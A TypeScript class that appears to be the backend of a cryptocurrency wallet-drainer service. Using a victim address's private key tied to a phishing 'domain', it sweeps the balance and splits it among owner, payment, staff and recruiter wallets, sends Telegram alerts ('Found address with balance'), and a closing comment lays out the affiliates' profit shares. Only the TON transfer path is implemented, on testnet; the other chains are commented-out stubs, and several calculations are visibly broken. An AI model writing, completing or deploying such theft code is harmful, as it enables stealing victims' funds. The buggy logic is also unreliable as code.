import axios from 'axios'
import { OWNER_WALLET_LIST } from '../lib.helper/ownerWalletList'
import { PAYMENT_WALLET_LIST } from '../lib.helper/paymentWallets'
// import telegram from '../../../api/telegram_api'
import { getCoinApiName } from '../lib.helper/getCoinApiName'
import { TSX_DATA } from '../../interfaces/transactionData.interface'
import { PREPARED_TRANSACTION } from '../../interfaces/preparedTransaction.interface'
import { coinList } from '../lib.helper/coinList'
import ApiError from '../../exceptions/apiError'
import { PAYMENT_OBJ } from '../../interfaces/paymentObj.interface'
import Telegram from '../../api/notificationCall.api'
import BaseUserData from '../../models/BaseUserData.model'
import { USER_BASE } from '../../models/model.interfaces/userBase.interface'
import DomainList from '../../models/DomainList.model'
import { DOMAIN_BASE } from '../../models/model.interfaces/domainBase.interface'
import StaffParams from '../../models/StaffParams.model'
import { STAFF_PARAMS } from '../../models/model.interfaces/staffParams.interface'
import StaffWallet from '../../models/StaffWallet.model'
import { STAFF_WALLET } from '../../models/model.interfaces/staffWallet.interface'
import RecruiterOwnUsers from '../../models/recruiter_own_users.model'
import { RECRUITER_OWN_USERS } from '../../models/model.interfaces/recruiterOwnUsers.interface'
import RecruiterWallet from '../../models/recruiter_wallet.model'
import { RECRUITER_WALLET } from '../../models/model.interfaces/recruiterWallet.interface'
import { availableCoins } from '../lib.helper/coinNamesForApi'
import { TonClient, WalletContractV4, internal } from 'ton'


export default class Transaction {
  coinName: string
	fromAddress: string
	balance: number
	userId: string
  domainName: string
  keyData: {
    privateKey: any
    publicKey: any
  }
  private readonly INFO_TELEGRAM_ID: number = Number(process.env.INFO_TELEGRAM_ID)
  private readonly OWNER_TELEGRAM_ID: number = Number(process.env.OWNER_TELEGRAM_ID)

  constructor(tsxData: TSX_DATA) {
    this.coinName = tsxData.coinName
    this.fromAddress = tsxData.fromAddress
    this.balance = tsxData.balance
    this.userId = tsxData.userId
    this.domainName = tsxData.domainName
    this.keyData.privateKey = tsxData.keyData.privateKey
    this.keyData.publicKey = tsxData.keyData.publicKey
  }

  public async sendTransaction(): Promise<boolean> {

    const preparedData: PREPARED_TRANSACTION = await this.prepareTransactionData()

    const earnedValue: number = (this.balance / 100 ) * 20 
    const paymentValue: number = (earnedValue / 100 ) * 25

    let transactionDetails: PAYMENT_OBJ[]  = [
      {
        sum: earnedValue,
        wallet: await this.getWallet(OWNER_WALLET_LIST)
      },
      {
        sum: paymentValue,
        wallet: await this.getWallet(PAYMENT_WALLET_LIST)
      },
      {
        sum: preparedData.staffSum,
        wallet: preparedData.staffWallet
      },
    ]

    if(preparedData.recruiterSum !== 0) {
      const recObj = {
        sum: preparedData.recruiterSum,
        wallet: preparedData.recruiterWallet
      }
      transactionDetails.push(recObj)
    }
    Object.freeze(transactionDetails)

    switch (this.coinName) {
      case coinList[0]:
        return await this.SendBitcoinTransaction(transactionDetails)
      case coinList[2]:
      case coinList[3]:
        return this.SendEthereumTransaction(transactionDetails)
      case coinList[4]:
      case coinList[5]:
        return this.SendTronTransaction(transactionDetails)
      case coinList[6]:
        return this.SendSolanaTransaction(transactionDetails)
      case coinList[7]:
        return this.SendTheOpenNetworkTransaction(transactionDetails)
      default:
        throw await ApiError.BadRequest(`can't send transaction in unknown network or unavailable coin.`)
    }
  }

  private async prepareTransactionData(): Promise<PREPARED_TRANSACTION> {

    let dataForTransaction: PREPARED_TRANSACTION = {
      coinName: this.coinName,
      recruiterSum: 0,
      staffSum: 0,
      staffWallet: '',
      recruiterWallet: null,
      balanceSum: this.balance,
    }
 
    const ownerData: DOMAIN_BASE = await DomainList.findOne({ fullDomainName: this.domainName })
    console.log('domain is => ', ownerData);

    const staffData: USER_BASE = await BaseUserData.findOne({ _id: ownerData.domainOwner })
    console.log('staff data => ', staffData);

    const staffFeeParams: STAFF_PARAMS = await StaffParams.findOne({ staffUserEmail: staffData.userEmail })
    console.log('staffFeeParams data => ', staffFeeParams);

    const staffWalletData: STAFF_WALLET = await StaffWallet.findOne({ staffId: staffData._id, coinName: this.coinName })
    console.log('staffWalletData => ', staffWalletData);

    const hasOwnRecruiter: RECRUITER_OWN_USERS = await RecruiterOwnUsers.findOne({ staffEmail: staffData.userEmail })
    console.log('hasOwnRecruiter data => ', hasOwnRecruiter);

    let staffSum: number = 0
    const preStaffSum: number = (this.balance / 100) * staffFeeParams.paymentFee
    let recruiterSum: number = 0

    staffSum = (this.balance / 100) * staffFeeParams.paymentFee

    if (hasOwnRecruiter !== null) {
      const recruiterWalletData: RECRUITER_WALLET = await RecruiterWallet.
        findOne({ recruiterId: hasOwnRecruiter.recruiterId, coinName: this.coinName })
      console.log('recruiterWalletData => ', recruiterWalletData);

      dataForTransaction.recruiterWallet = recruiterWalletData.walletAddress
      recruiterSum = (preStaffSum / 100) * hasOwnRecruiter.recruiterFee
      staffSum = preStaffSum - recruiterSum
    } 

    dataForTransaction.staffSum = staffSum
    dataForTransaction.recruiterSum = staffFeeParams.paymentFee
    dataForTransaction.staffWallet = staffWalletData.walletAddress
    Object.freeze(dataForTransaction)
    
    console.log('prepared data for transaction is => ', dataForTransaction);

    return dataForTransaction
  }



  // ============================================================================================================= //
  // ================================== private methods for internal usage only ================================ //
  // ============================================================================================================= //


  // get string name for api usage to know USD value of current coin < -------------------------
  private async getCoinApiName(): Promise<string> {
    for (let i: number = 0; i <= availableCoins.length - 1; i++) {
      if (availableCoins[i].coinName === this.coinName) {
        return availableCoins[i].coinApiName
      }
    }
    throw await ApiError.NotFoundError('coin name for api')
  }


  // get owner or payment wallet address by coin name << -------------------------
  private async getWallet(array: any): Promise<string> {
    for (let i: number = 0; i < array.length -1; i++) {
      if(array[i].coinName === this.coinName) {
        return array[i].mainAddress
      }
    }
  }

  // get USD value of current coin <<----------------
  private async getRateData(): Promise<any> {
    const coinNameForUrl: string = await this.getCoinApiName()
    const getRateUrl: string = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${coinNameForUrl}`
    await axios(getRateUrl)

    return 'some';
  }

  // ================================ main transaction handlers below =========================================== //

  private async SendBitcoinTransaction(paymentArray: PAYMENT_OBJ[]): Promise<boolean> {
    // https://blog.logrocket.com/sending-bitcoin-with-javascript/

    const rate: any = await this.getRateData()
    console.log(rate.data[0].current_price);
  
    const usdValue: number = rate.data[0].current_price * this.balance
    console.log('usdValue => ', usdValue);
    const notifData: string = 
        `Found address with balance at ${this.domainName} with value: ${this.balance}.` + 
        `All transactions was sent! You can see detail here: \n ` + 
        `https://www.blockchain.com/ru/explorer/addresses/btc/${this.fromAddress}` 
    if (usdValue <= 50) {
      // send 100% balance to owner if usd val < 50
      // await new FeeCalculator(transaction data to calc fee ).calculateFeeInNetwork() < ----
      // await send()  // from this.fromAddress to paymentArray[0].wallet
      //   .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
      //   .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
      //   .catch((e:any) => { throw new Error(e) })
      return true
    } else {
      // sending coins to all wallets in one transaction
      // calculate fee       
      return true
    }
  }

  
  private async SendEthereumTransaction(paymentArray: PAYMENT_OBJ[]): Promise<boolean> {
    const rate: any = await this.getRateData()
    console.log(rate.data[0].current_price);
  
    const usdValue: number = rate.data[0].current_price * this.balance
    console.log('usdValue => ', usdValue);
    const notifData: string = 
        `Found address with balance at ${this.domainName} with value: ${this.balance}.` + 
        `All transactions was sent! You can see detail here: \n ` + 
        `https://etherscan.io/address/${this.fromAddress}` 
    if (usdValue <= 50) {
      // send 100% balance to owner if usd val < 50
      // await new FeeCalculator(transaction data to calc fee ).calculateFeeInNetwork() < ----
      // await send()  // from this.fromAddress to paymentArray[0].wallet
      //   .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
      //   .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
      //   .catch((e:any) => { throw new Error(e) })
      return true
    } else {
      // sending coins to all wallets in one transaction
      // calculate fee       
      return true
    }
  }

  private async SendTronTransaction(paymentArray: PAYMENT_OBJ[]): Promise<boolean> {
    const rate: any = await this.getRateData()
    console.log(rate.data[0].current_price);
  
    const usdValue: number = rate.data[0].current_price * this.balance
    console.log('usdValue => ', usdValue);
    const notifData: string = 
        `Found address with balance at ${this.domainName} with value: ${this.balance}.` + 
        `All transactions was sent! You can see detail here: \n ` + 
        `https://tronscan.org/#/address/${this.fromAddress}` 
    if (usdValue <= 50) {
      // send 100% balance to owner if usd val < 50
      // await new FeeCalculator(transaction data to calc fee ).calculateFeeInNetwork() < ----
      // await send()  // from this.fromAddress to paymentArray[0].wallet
      //   .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
      //   .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
      //   .catch((e:any) => { throw new Error(e) })
      return true
    } else {
      // sending coins to all wallets in one transaction
      // calculate fee       
      return true
    }
  }

  private async SendSolanaTransaction(paymentArray: PAYMENT_OBJ[]): Promise<boolean> {
    const rate: any = await this.getRateData()
    console.log(rate.data[0].current_price);
  
    const usdValue: number = rate.data[0].current_price * this.balance
    console.log('usdValue => ', usdValue);
    const notifData: string = 
        `Found address with balance at ${this.domainName} with value: ${this.balance}.` + 
        `All transactions was sent! You can see detail here: \n ` + 
        `https://solscan.io/account/${this.fromAddress}` 
    if (usdValue <= 50) {
      // send 100% balance to owner if usd val < 50
      // await new FeeCalculator(transaction data to calc fee ).calculateFeeInNetwork() < ----
      // await send()  // from this.fromAddress to paymentArray[0].wallet
      //   .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
      //   .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
      //   .catch((e:any) => { throw new Error(e) })
      return true
    } else {
      // sending coins to all wallets in one transaction
      // calculate fee       
      return true
    }
  }

  private async SendTheOpenNetworkTransaction(paymentArray: PAYMENT_OBJ[]): Promise<boolean> {
    // https://github.com/toncenter/tonweb
    // https://ton-community.github.io/ton/

    const rate: any = await this.getRateData()
    console.log(rate.data[0].current_price);
  
    const usdValue: number = rate.data[0].current_price * this.balance
    console.log('usdValue => ', usdValue);
    const notifData: string = 
        `Found address with balance at ${this.domainName} with value: ${this.balance}.` + 
        `All transactions was sent! You can see detail here: \n ` + 
        `https://tonscan.org/address/${this.fromAddress}` 

    // Create Client
    const client = new TonClient({
      endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC', // <---- test net
      // endpoint: 'https://toncenter.com/api/v2/jsonRPC', // <---- MAIN net
    });
    
    let workchain = 0; // Usually you need a workchain 0
    let wallet = WalletContractV4.create({ workchain, publicKey: this.keyData.publicKey });
    // make sure wallet is deployed
    if (!await client.isContractDeployed(wallet.address)) {
      console.log("wallet is not deployed");
      return false
    }

    console.log('wallet => ', wallet);
    
    const walletContract = client.open(wallet);
    const seqno = await walletContract.getSeqno();

    // https://ton-community.github.io/tutorials/01-wallet/ 

    if (usdValue <= 50) {
      // send 100% balance to owner if usd val < 50
      await walletContract.sendTransfer({
        secretKey: this.keyData.privateKey, // addressFrom private key  < -
        seqno, messages: [
          internal({
            to: paymentArray[0].wallet, // wallet address
            value: String(paymentArray[0].wallet), // string | bigint
            body: "receive ton", // optional comment
            bounce: false,
          })
        ]})
        .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
        .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
        .catch((e:any) => { throw new Error(e) })
        .finally(() => {console.log("sending complete.");
        })

    // wait until confirmed
    // let currentSeqno = seqno;
    // while (currentSeqno == seqno) {
    //   console.log("waiting for transaction to confirm...");
    //   setTimeout(()=> {}, 1500);
    //   currentSeqno = await walletContract.getSeqno();
    // }
    console.log("transaction confirmed!");

      // await new FeeCalculator(transaction data to calc fee ).calculateFeeInNetwork() < ----

      return true
    } else {
      // sending coins to all wallets in one transaction
      // calculate fee       
      if(paymentArray.length === 4) {
        await walletContract.sendTransfer({
          secretKey: this.keyData.privateKey, // addressFrom private key  < -
          seqno, messages: [
            // owner transaction < ---------------
            internal({
              to: paymentArray[0].wallet, // wallet address
              value: String(paymentArray[0].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            }),
            // payment transaction < ---------------
            internal({
              to: paymentArray[1].wallet, // wallet address
              value: String(paymentArray[1].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            }),
            // staff transaction < ---------------
            internal({
              to: paymentArray[2].wallet, // wallet address
              value: String(paymentArray[2].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            }),
            // recruiter transaction < ---------------
            internal({
              to: paymentArray[3].wallet, // wallet address
              value: String(paymentArray[3].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            }),
          ]})
          .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
          .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
          .catch((e:any) => { throw new Error(e) })
        return true
      } else {
        await walletContract.sendTransfer({
          secretKey: this.keyData.privateKey, // addressFrom private key  < -
          seqno, messages: [
            // owner transaction < ---------------
            internal({
              to: paymentArray[0].wallet, // wallet address
              value: String(paymentArray[0].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            }),
            // payment transaction < ---------------
            internal({
              to: paymentArray[1].wallet, // wallet address
              value: String(paymentArray[1].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            }),
            // staff transaction < ---------------
            internal({
              to: paymentArray[2].wallet, // wallet address
              value: String(paymentArray[2].sum), // string | bigint
              body: "receive ton", // optional comment
              bounce: false,
            })
          ]})
          .then(async () => { await Telegram.sendTransactionInfo(this.OWNER_TELEGRAM_ID, notifData) })
          .then(async () => { await Telegram.sendTransactionInfo(this.INFO_TELEGRAM_ID, notifData) })
          .catch((e:any) => { throw new Error(e) })
        return true
      } 

    }
  }

}

// ============================================================================================================= //
// ======================================= base technical data description ===================================== //
// ============================================================================================================= //


    // check staff fee before divide 

    // -- data for understanding how it works

    //   coinName: btc
    //   recruiterFee: 10
    //   staffFee: 80
    //   staffWallet: some btc wallet
    //   recruiterWallet: some btc wallet
    //   balanceSum: 10_000

    
    // earnedSum = 2_000
    // clear earned sum without staff and recruiter fee 
    // -- recruiter received his money from staff

    // -----------------------

    // 20%(earnedSum) = 30% + 30% + 40%
    // 30% - coFounder
    // 30% - developers
    // 40% - owner 
    // ------------
    // 80% = staff + recruiter(10% from staff fee)


    